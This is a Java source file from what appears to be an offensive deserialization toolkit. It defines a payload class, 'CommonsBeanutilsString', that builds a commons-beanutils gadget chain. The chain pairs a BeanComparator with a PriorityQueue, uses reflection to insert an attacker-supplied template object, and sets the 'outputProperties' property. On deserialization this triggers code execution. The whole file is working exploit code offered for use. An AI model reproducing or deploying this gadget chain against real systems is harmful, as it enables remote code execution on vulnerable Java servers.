package com.summersec.attack.deser.payloads;

import com.summersec.attack.deser.payloads.annotation.Authors;
import com.summersec.attack.deser.payloads.annotation.Dependencies;
import com.summersec.attack.deser.util.Reflections;
import java.util.Comparator;
import java.util.PriorityQueue;
import java.util.Queue;
import org.apache.commons.beanutils.BeanComparator;


@Dependencies({"commons-beanutils:commons-beanutils:1.8.3"})
@Authors({"phith0n"})
public class CommonsBeanutilsString implements ObjectPayload<Queue<Object>> {
    @Override
    public Queue<Object> getObject(Object template) throws Exception {
        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);

        PriorityQueue<String> queue = new PriorityQueue(2, (Comparator<?>)beanComparator);

        queue.add("1");
        queue.add("1");

        Reflections.setFieldValue(queue, "queue", new Object[] { template, template });

        Reflections.setFieldValue(beanComparator, "property", "outputProperties");

        return (Queue)queue;
    }
}



